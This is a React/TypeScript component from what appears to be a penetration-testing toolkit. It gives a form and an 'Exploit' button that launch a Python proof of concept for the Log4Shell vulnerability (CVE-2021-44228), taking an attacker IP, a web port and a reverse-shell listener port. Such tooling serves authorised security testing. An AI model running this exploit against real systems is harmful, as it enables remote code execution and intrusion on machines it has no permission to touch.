import { Button, Stack, TextInput, NumberInput } from "@mantine/core";
import { useForm } from "@mantine/form";
import { useCallback, useState, useEffect } from "react";
import { CommandHelper } from "../../utils/CommandHelper";
import ConsoleWrapper from "../ConsoleWrapper/ConsoleWrapper";
import { RenderComponent } from "../UserGuide/UserGuide";
import { SaveOutputToTextFile_v2 } from "../SaveOutputToFile/SaveOutputToTextFile";
import { LoadingOverlayAndCancelButton } from "../OverlayAndCancelButton/OverlayAndCancelButton";
import { checkAllCommandsAvailability } from "../../utils/CommandAvailability";
import InstallationModal from "../InstallationModal/InstallationModal";

/**
The CVE202144228 component
 * @returns The CVE202144228 component.
 */
interface FormValuesType {
    attackerIP: string;
    webPort: number;
    localPort: number;
}
// Component Constants.
const title = "CVE-2021-44228"; // Title for the CVE 2021-44228 exploit.
const description =
    "This attack vector exploits vulnerabilities within Apache's Log4j2 where an attacker that is in control of log " +
    "message/log message parameters is able to execute remote arbitrary code that is to be loaded in from LDAP servers " +
    "upon message lookup substitution being active.\n\nFurther information can be found at: https://nvd.nist.gov/vuln/" +
    "detail/cve-2021-44228\n"; // Description providing information about the CVE 2021-4428 exploit.
const steps =
    "Step 1: Enter an Attacker IP address.\n" +
    "       Eg: 127.0.0.1\n" +
    "Step 2: Enter a Web Port.\n" +
    "       Eg: 8000\n" +
    "Step 3: Enter a Local Port.\n" +
    "       Eg: 9001\n" +
    "Step 4: Click Exploit to commence the exploits operation.\n" +
    "Step 5: View the Output block below to view the results of the attack vectors execution.";
const sourceLink = "cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"; // Link to the source code (or Kali Tools).
const tutorial = ""; // Link to the official documentation/tutorial.
const dependencies = ["python3"]; // Contains the dependencies required by the component.

/**
 * @returns The LOG4j Exploit component.
 */
const CVE202144228 = () => {
    const [loading, setLoading] = useState(false); // State variable to indicate loading state.
    const [allowSave, setAllowSave] = useState(false); // State variable boolean to indicate save state.
    const [hasSaved, setHasSaved] = useState(false); // State variable boolean to indicate if the save has been saved.
    const [pid, setPid] = useState(""); // State variable to store the process ID of the command execution.
    const [isCommandAvailable, setIsCommandAvailable] = useState(false); // State variable to check if the command is available.
    const [opened, setOpened] = useState(!isCommandAvailable); // State variable that indicates if the modal is opened.
    const [loadingModal, setLoadingModal] = useState(true); // State variable to indicate loading state of the modal.
    const [output, setOutput] = useState(""); // State variable to store the output of the command execution.

    // Form Hook to handle form input.
    let form = useForm({
        initialValues: {
            attackerIP: "127.0.0.1",
            webPort: 8000,
            localPort: 9001,
        },
    });

    useEffect(() => {
        // Check if the command is available and set the state variables accordingly.
        checkAllCommandsAvailability(dependencies)
            .then((isAvailable) => {
                // Set the command availability state.
                setIsCommandAvailable(isAvailable);
                // Set the modal state to opened if the command is not available.
                setOpened(!isAvailable);
                // Set loading to false after the check is done.
                setLoadingModal(false); // Ensure this is set to false even if successful
            })
            .catch((error) => {
                console.error("An error occurred:", error);
                // Also set loading to false in case of error.
                setLoadingModal(false); // Crucial change, set to false even on errors
            });
    }, []);

    /**
     * handleProcessData: Callback to handle and append new data from the child process to the output.
     * It updates the state by appending the new data received to the existing output.
     * @param {string} data - The data received from the child process.
     */
    const handleProcessData = useCallback((data: string) => {
        setOutput((prevOutput) => prevOutput + "\n" + data); // Append new data to the previous output.
    }, []);

    /**
     * handleProcessTermination: Callback to handle the termination of the child process.
     * Once the process termination is handled, it clears the process PID reference and
     * deactivates the loading overlay.
     * @param {object} param - An object containing information about the process termination.
     * @param {number} param.code - The exit code of the terminated process.
     * @param {number} param.signal - The signal code indicating how the process was terminated.
     */
    const handleProcessTermination = useCallback(
        ({ code, signal }: { code: number; signal: number }) => {
            // If the process was successful, display a success message.
            if (code === 0) {
                handleProcessData("\nProcess completed successfully.");
                // If the process was terminated manually, display a termination message.
            } else if (signal === 15) {
                handleProcessData("\nProcess was manually terminated.");
                // If the process was terminated with an error, display the exit and signal codes.
            } else {
                handleProcessData(`\nProcess terminated with exit code: ${code} and signal code: ${signal}`);
            }
            // Clear the child process pid reference. There is no longer a valid process running.
            setPid("");
            // Cancel the loading overlay. The process has completed.
            setLoading(false);
            // Allow Saving as the output is finalised
            setAllowSave(true);
            setHasSaved(false);
        },
        [handleProcessData] // Dependency on the handleProcessData callback
    );

    /**
     * Function to handle form submission.
     * Executes the Log4J exploit with the provided form values.
     * @param {FormValues} values - Form values containing attacker IP, web port, and local port.
     */
    const onSubmit = async (values: FormValuesType) => {
        // Activate loading state to indicate ongoing process.
        setLoading(true);
        // Disallow saving until the tool's execution is complete
        setAllowSave(false);
        // Construct arguments for the Log4J exploit command based on form input.
        const args = [
            "/usr/share/ddt/log4j-shell-poc/poc.py",
            "--userip",
            values.attackerIP,
            "--webport",
            `${values.webPort}`,
            "--lport",
            `${values.localPort}`,
        ];

        try {
            //Execute the LOG4j command via helper method and handle its output or potential errors.
            const result = await CommandHelper.runCommandGetPidAndOutput(
                "python3",
                args,
                handleProcessData,
                handleProcessTermination
            );
            //Update command with the result.
            setOutput(result.output);
            console.log(pid);
            setPid(result.pid);

            //Display output error messages.
        } catch (error) {
            console.error("An error occurred while executing the command:", error);
        } finally {
            // Deactivate loading state
            setLoading(false);
            // Activate AllowSave to generate output results.
            setAllowSave(true);
        }
    };

    /**
     * clearOutput: Callback function to clear the console output.
     * It resets the state variable holding the output, thereby clearing the display.
     */
    const clearOutput = useCallback(() => {
        setOutput("");
        setHasSaved(false);
        setAllowSave(false);
    }, [setOutput]);

    /**
     * handleSaveComplete: Callback to handle the completion of the file saving process.
     * It updates the state by indicating that the file has been saved and deactivates the save button.
     */
    const handleSaveComplete = () => {
        // Indicating that the file has saved which is passed
        // back into SaveOutputToTextFile to inform the user
        setHasSaved(true);
        setAllowSave(false);
    };

    /**
     * killProcess, kills the proccess and handles it output to display error messages or completion message
     */
    const killProcess = async () => {
        if (!pid) {
            alert("Nothing to kill.");
            return;
        }

        try {
            //Execute the killProcess command using the pid
            await CommandHelper.runCommand("kill", [pid]);
            //Set output and display message with pid if killed
            setOutput((prevOutput) => prevOutput + `\nProcess ${pid} is killed and is dead.`);
            //Set Pid after killing process
            setPid("");
            //Catch errors
        } catch (error) {
            //Set output and catch errors and display pid and display error message
            setOutput((prevOutput) => prevOutput + `\nFailed to kill process with ${pid}: ${(error as Error).message}`);
        }
    };

    return (
        <RenderComponent
            title={title}
            description={description}
            steps={steps}
            tutorial={tutorial}
            sourceLink={sourceLink}
        >
            {!loadingModal && (
                <InstallationModal
                    isOpen={opened}
                    setOpened={setOpened}
                    feature_description={description}
                    dependencies={dependencies}
                ></InstallationModal>
            )}

            <form onSubmit={form.onSubmit(onSubmit)}>
                <Stack>
                    {LoadingOverlayAndCancelButton(loading, pid)}
                    <TextInput label={"Attacker IP Address"} required {...form.getInputProps("attackerIP")} />
                    <NumberInput label={"Web Port"} required {...form.getInputProps("webPort")} />
                    <NumberInput label={"Local Port"} required {...form.getInputProps("localPort")} />
                    <Button type={"submit"}>Exploit</Button>
                    <Button type={"button"} onClick={killProcess} disabled={!pid}>
                        Kill Process
                    </Button>
                    {SaveOutputToTextFile_v2(output, allowSave, hasSaved, handleSaveComplete)}
                    <ConsoleWrapper output={output} clearOutputCallback={clearOutput} />
                </Stack>
            </form>
        </RenderComponent>
    );
};

export default CVE202144228;
